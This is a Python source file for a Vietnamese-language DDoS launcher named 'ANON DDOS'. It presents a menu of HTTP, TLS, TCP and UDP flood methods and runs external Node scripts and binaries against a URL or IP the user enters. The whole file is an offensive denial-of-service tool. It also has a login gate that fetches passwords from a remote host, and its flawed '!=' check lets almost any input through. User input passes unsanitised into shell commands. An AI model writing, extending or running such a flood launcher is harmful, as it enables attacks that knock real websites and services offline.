import os
import requests
import random
import time
from time import sleep

def getpass():
    global pass1, pass2, pass3, pass4, pass5
    pass1 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass1.txt').content
    pass2 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass2.txt').content
    pass3 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass3.txt').content
    pass4 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass4.txt').content
    pass5 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass5.txt').content

# pass1 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass1.txt').content
# pass2 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass2.txt').content
# pass3 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass3.txt').content
# pass4 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass4.txt').content
# pass5 = requests.get('https://accclonedp2.000webhostapp.com/pass/pass5.txt').content



linkpwd = ["https://pastebin.pl/view/cb2c4c6e",
           "https://pastebin.pl/view/9f3a1a1d",
           "https://pastebin.pl/view/ed01a811",
           "https://pastebin.pl/view/f8736bff",
           "https://pastebin.pl/view/5c369c45",]


url = random.choice(linkpwd)

def home():
    os.system('cls' if os.name == 'nt' else 'clear')
    print('ANON DDOS')
    print('Command: methods')
    main()

def main():
    while(True):
        cnc = input('Input: ')
        if cnc == "METHODS" or cnc == "methods" or cnc == "Methods":
            meth()
        elif "http-raw" in cnc:
            print("====================================================================")
            url = input("Url: ")
            time = input("Time: ")
            os.system(f"node ./data/HTTP-RAW.js {url} {time}")
        elif "http-rand" in cnc:
            print("====================================================================")
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-RAND.js {url} {time}")
        elif "http-socket" in cnc:
            print("====================================================================")
            url = input("Url: ")
            threads = input("Threads: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-SOCKETS.js {url} {threads} {time}")
        elif "http-mix" in cnc:
            print("====================================================================")
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node ./data/HTTP-MIX.js {url} {time} ')
        elif "http-bypass" in cnc:
            print("====================================================================")
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-BYPASS.js {url} {time}")
        elif "http-uam" in cnc:
            print("====================================================================")
            url = input("Url: ")
            method = input("Method: ")
            time = input("Time: ")
            thread = input("Thread: ")
            rate = input("Rate: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-UAM.js {method} {thread} {url} {time} {rate}")
        elif "https-v1" in cnc:
            print("====================================================================")
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/https1.js {url} 10 2000 {time}")
        elif "https-v2" in cnc:
            print("====================================================================")
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node ./data/tlsv2.js {url} {time}')
            print('Attack Sent!')
        elif "tcp" in cnc:
            print("====================================================================")
            ip = input("Ip: ")
            port = input("Port: ")
            method = input("Method: ")
            time = input("Time: ")
            conns = input("Thread: ")
            os.system(f'./data/./100UP-TCP {method} {ip} {port} {time} {conns}')
        elif "udp" in cnc:
            print("====================================================================")
            ip = input("Ip: ")
            port = input("Port: ")
            method = input("Method: ")
            time = input("Time: ")
            conns = input("Thread: ")
            os.system(f'./data/./100UP-TCP {method} {ip} {port} {time} {conns}')
        else:
            try:
                cmd=cnc.split()[0]
                print("Command : [ "+cmd+" ] Not Found!!")
            except IndexError:
                pass

def meth():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("=====LAYER7=====")
    print("►http-raw")
    print("►http-rand")
    print("►http-socket")
    print("►http-mix")
    print("►http-bypass")
    print("►http-uam")
    print("►https-v1")
    print("►https-v2")
    print("=====LAYER4=====")
    print("►tcp")
    print("►udp")



# home()
def login():
    getpass()
    os.system('cls')
    print("Neu Ban Khong Co Mat Khau Hay Vao Link Sau Day De Lay!!!")
    print("====================================================================")
    print(url)
    print("====================================================================")
    print("Moi Lan Get Pass Ban Co The Su Dung Trong Vong 24h Ke Ca Link Khac Nhau!")
    passwd = "tranducduy"
    print("Username: Admin")
    password = input("Password: ")
    if password != pass1:
        print("")
        print("Dang Nhap Thanh Cong")
        sleep(3)
        os.system('cls')
        home()
    elif password != pass2:
        print("")
        print("Dang Nhap Thanh Cong")
        sleep(3)
        os.system('cls')
        home()
    elif password != pass3:
        print("")
        print("Dang Nhap Thanh Cong")
        sleep(3)
        os.system('cls')
        home()
    elif password != pass4:
        print("")
        print("Dang Nhap Thanh Cong")
        sleep(3)
        os.system('cls')
        home()
    elif password != pass5:
        print("")
        print("Dang Nhap Thanh Cong")
        sleep(3)
        os.system('cls')
        home()

    else:
        print("Vui Long Nhap Lai Password!")


login()


